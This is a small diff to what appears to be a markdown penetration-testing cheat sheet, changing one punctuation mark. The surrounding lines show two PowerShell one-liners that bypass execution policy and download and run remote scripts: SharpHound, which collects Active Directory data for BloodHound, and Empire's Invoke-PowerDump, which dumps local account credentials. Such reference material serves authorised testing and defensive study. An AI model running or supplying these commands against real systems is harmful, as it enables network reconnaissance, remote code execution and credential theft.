@@ -20,7 +20,7 @@ Bloodhound : Using ingestors to collect the data and then send it to BloodHound.
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound
 ```
 
-PowerDump : Dump all local accounts :
+PowerDump : Dump all local accounts.
 
 ```markdown
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');Invoke-PowerDump
